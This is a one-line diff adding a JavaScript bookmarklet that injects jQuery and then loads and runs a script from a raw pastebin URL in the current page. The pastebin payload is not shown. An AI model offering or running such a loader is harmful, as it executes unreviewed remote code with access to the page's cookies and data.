@@ -1,0 +1,1 @@
+javascript:var b = document.createElement('script');b.setAttribute('src','https://code.jquery.com/jquery-1.12.4.min.js');document.head.appendChild(b);var a = document.createElement('script');a.setAttribute('src','https://pastebin.com/raw/RTaUfPBj');document.head.appendChild(a);
